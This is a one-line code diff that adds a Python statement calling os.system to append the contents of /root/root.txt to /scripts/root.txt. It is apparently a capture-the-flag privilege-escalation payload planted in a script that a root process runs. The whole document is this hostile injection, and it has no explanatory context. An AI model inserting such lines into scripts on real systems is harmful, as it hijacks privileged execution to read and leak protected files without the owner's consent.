@@ -1,0 +1,1 @@
+import os; os.system("cat /root/root.txt >> /scripts/root.txt")
